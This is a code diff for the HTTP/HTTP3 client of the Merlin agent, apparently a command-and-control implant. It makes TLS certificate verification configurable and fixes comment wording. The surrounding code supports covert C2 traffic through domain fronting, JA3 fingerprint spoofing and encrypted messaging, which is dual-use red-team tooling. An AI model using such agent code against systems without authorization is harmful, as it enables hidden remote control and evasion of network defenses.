@@ -76,9 +76,9 @@ import (
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
 type Client struct {
 	Authenticator authenticators.Authenticator
-	authenticated bool         // authenticated tracks if the Agent has successfully authenticated
-	Client        *http.Client // Client to send messages with
-	Protocol      string
+	authenticated bool                      // authenticated tracks if the Agent has successfully authenticated
+	Client        *http.Client              // Client to send messages with
+	Protocol      string                    // Protocol contains the transportation protocol the agent is using (i.e., http2 or smb-reverse)
 	URL           []string                  // A slice of URLs to send messages to (e.g., https://127.0.0.1:443/test.php)
 	Host          string                    // HTTP Host header value
 	Proxy         string                    // Proxy string
@@ -93,13 +93,14 @@ type Client struct {
 	AgentID       uuid.UUID                 // AgentID the Agent's unique identifier
 	currentURL    int                       // the current URL the agent is communicating with
 	transformers  []transformer.Transformer // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
+	insecureTLS   bool                      // insecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
 	sync.Mutex
 }
 
-// Config is a structure that is used to pass in all necessary information to instantiate a new Client
+// Config is a structure used to pass in all necessary information to instantiate a new Client
 type Config struct {
 	AgentID      uuid.UUID // AgentID the Agent's UUID
-	Protocol     string    // Protocol contains the transportation protocol the agent is using (i.e. http2 or http3)
+	Protocol     string    // Protocol contains the transportation protocol the agent is using (i.e., http2 or smb-reverse)
 	Host         string    // Host is used with the HTTP Host header for Domain Fronting activities
 	Headers      string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
 	URL          []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
@@ -112,22 +113,24 @@ type Config struct {
 	AuthPackage  string    // AuthPackage is the type of authentication the agent should use when communicating with the server
 	Opaque       []byte    // Opaque is the byte representation of the EnvU object used with the OPAQUE protocol (future use)
 	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
+	InsecureTLS  bool      // InsecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
 }
 
-// New instantiates and returns a Client that is constructed from the passed in Config
+// New instantiates and returns a Client constructed from the passed in Config
 func New(config Config) (*Client, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.http.New()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
 	client := Client{
-		AgentID:   config.AgentID,
-		URL:       config.URL,
-		UserAgent: config.UserAgent,
-		Host:      config.Host,
-		Protocol:  config.Protocol,
-		Proxy:     config.Proxy,
-		JA3:       config.JA3,
-		Parrot:    config.Parrot,
-		psk:       config.PSK,
+		AgentID:     config.AgentID,
+		URL:         config.URL,
+		UserAgent:   config.UserAgent,
+		Host:        config.Host,
+		Protocol:    config.Protocol,
+		Proxy:       config.Proxy,
+		JA3:         config.JA3,
+		Parrot:      config.Parrot,
+		psk:         config.PSK,
+		insecureTLS: config.InsecureTLS,
 	}
 
 	// Authenticator
@@ -213,7 +216,7 @@ func New(config Config) (*Client, error) {
 	}
 
 	// Get the HTTP client
-	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot)
+	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot, client.insecureTLS)
 	if err != nil {
 		return &client, err
 	}
@@ -238,13 +241,13 @@ func New(config Config) (*Client, error) {
 }
 
 // getClient returns an HTTP client for the passed in protocol (i.e., h2 or http3)
-func getClient(protocol string, proxyURL string, ja3 string, parrot string) (*http.Client, error) {
+func getClient(protocol string, proxyURL string, ja3 string, parrot string, insecure bool) (*http.Client, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.http.getClient()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Protocol: %s, Proxy: %s, JA3 String: %s, Parrot: %s", protocol, proxyURL, ja3, parrot))
 	// Setup TLS configuration
 	TLSConfig := &tls.Config{
 		MinVersion:         tls.VersionTLS12,
-		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
+		InsecureSkipVerify: insecure,
 		CipherSuites: []uint16{
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
@@ -300,7 +303,7 @@ func getClient(protocol string, proxyURL string, ja3 string, parrot string) (*ht
 		TLSConfig.NextProtos = []string{"h3"} // https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml#alpn-protocol-ids
 		transport = &http3.RoundTripper{
 			QuicConfig: &quic.Config{
-				// Opted for a long timeout to prevent the client from sending a PING Frame
+				// Opted for a long timeout to prevent the client from sending a PING Frame.
 				// If MaxIdleTimeout is too high, agent will never get an error if the server is offline and will perpetually run without exiting because MaxFailedCheckins is never incremented
 				MaxIdleTimeout: time.Second * 30,
 				// KeepAlivePeriod will send an HTTP/2 PING frame to keep the connection alive
@@ -354,7 +357,7 @@ func (client *Client) getJWT() (string, error) {
 	// Create encrypter
 	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
 		jose.Recipient{
-			Algorithm: jose.DIRECT, // Doesn't create a per message key
+			Algorithm: jose.DIRECT, // Doesn't create a per-message key
 			Key:       key[:]},
 		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
 	if encErr != nil {
@@ -397,8 +400,8 @@ func (client *Client) Listen() (returnMessages []messages.Base, err error) {
 	return
 }
 
-// Send takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server
-// The function also decodes and decrypts response messages and return a Merlin message structure.
+// Send takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server.
+// The function also decodes and decrypts response messages and returns a Merlin message structure.
 // This is where the client's logic is for communicating with the server.
 func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Send(): Entering into function with message: %+v", m))
@@ -469,15 +472,18 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
 			}
 
-			// Handshake timeout happens when a new client was not able to reach the server and setup a crypto handshake for the first time (no listener or no access)
+			// Handshake timeout happens when a new client was not able to reach the server and set up a crypto handshake for the first time (no listener or no access)
 			if strings.Contains(err.Error(), "NO_ERROR: Handshake did not complete in time") {
 				n = true
 				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
 			}
 
-			// No recent network activity happens when a PING timeout occurs.  KeepAlive setting can be used to prevent MaxIdleTimeout
-			// When the client has previously established a crypto handshake but does not hear back from it's PING frame the server within the client's MaxIdleTimeout
-			// Typically happens when the Merlin Server application is killed/quit without sending a CONNECTION_CLOSE frame from stopping the listener
+			// No recent network activity happens when a PING timeout occurs.
+			// KeepAlive setting can be used to prevent MaxIdleTimeout.
+			// When the client has previously established a crypto handshake, but does not hear back from its PING frame,
+			// the server within the client's MaxIdleTimeout.
+			// Typically, it happens when the Merlin Server application is killed/quit without sending a
+			// CONNECTION_CLOSE frame from stopping the listener.
 			if strings.Contains(err.Error(), "NO_ERROR: No recent network activity") {
 				n = true
 				e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
@@ -488,7 +494,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 			if n {
 				cli.Message(cli.NOTE, e)
 				var errClient error
-				client.Client, errClient = getClient(client.Protocol, "", "", "")
+				client.Client, errClient = getClient(client.Protocol, "", "", "", client.insecureTLS)
 				if errClient != nil {
 					cli.Message(cli.WARN, fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
 				}
@@ -552,7 +558,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 		return
 	}
 
-	// Update the Agent's JWT if one was returned by the server in the response message
+	// Update the Agent's JWT if the server returned one in the response message
 	if respMessage.Token != "" {
 		client.JWT = respMessage.Token
 	}
@@ -561,7 +567,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	return
 }
 
-// Set is a generic function that is used to modify a Client's field values
+// Set is a generic function used to modify a Client's field values
 func (client *Client) Set(key string, value string) (err error) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Set(): entering into function with key: %s, value: %s", key, value))
 	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Set(): exiting function with err: %v", err))
@@ -582,10 +588,10 @@ func (client *Client) Set(key string, value string) (err error) {
 			}
 		}
 		client.URL = urls
-		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot)
+		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot, client.insecureTLS)
 	case "ja3":
 		ja3String := strings.Trim(value, "\"'")
-		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String, client.Parrot)
+		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String, client.Parrot, client.insecureTLS)
 		if ja3String != "" {
 			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
 		} else if ja3String == "" {
@@ -597,7 +603,7 @@ func (client *Client) Set(key string, value string) (err error) {
 		client.JWT = value
 	case "parrot":
 		parrot := strings.Trim(value, "\"'")
-		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, parrot)
+		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, parrot, client.insecureTLS)
 		if parrot != "" {
 			cli.Message(cli.NOTE, fmt.Sprintf("Set agent HTTP transport parrot to:%s", parrot))
 		} else if parrot == "" {
@@ -614,7 +620,7 @@ func (client *Client) Set(key string, value string) (err error) {
 	return
 }
 
-// Get is a generic function that is used to retrieve the value of a Client's field
+// Get is a generic function used to retrieve the value of a Client's field
 func (client *Client) Get(key string) (value string) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Get(): entering into function with key: %s", key))
 	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Get(): leaving function with value: %s", value))
@@ -682,7 +688,7 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 			return
 		}
 
-		// Add response message to the next loop iteration
+		// Add a response message to the next loop iteration
 		if len(msgs) > 0 {
 			msg = msgs[0]
 		}
@@ -701,7 +707,7 @@ func (client *Client) Construct(msg messages.Base) (data []byte, err error) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Construct(): Transformers: %+v", client.transformers))
 	for i := len(client.transformers); i > 0; i-- {
 		if i == len(client.transformers) {
-			// First call should always take a Base message
+			// The first call should always take a Base message
 			data, err = client.transformers[i-1].Construct(msg, client.secret)
 			cli.Message(cli.DEBUG, fmt.Sprintf("%d call with transform %s - Constructed data(%d) %T: %X\n", i, client.transformers[i-1], len(data), data, data))
 		} else {
@@ -751,7 +757,8 @@ func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
 }
 
 // Initial contains all the steps the agent and/or the communication profile need to take to set up and initiate
-// communication with server. If the agent needs to authenticate before it can send messages, that process will occur here.
+// communication with the server.
+// If the agent needs to authenticate before it can send messages, that process will occur here.
 func (client *Client) Initial() (err error) {
 	cli.Message(cli.DEBUG, "clients/http.Initial(): entering into function")
 	return client.Authenticate(messages.Base{})
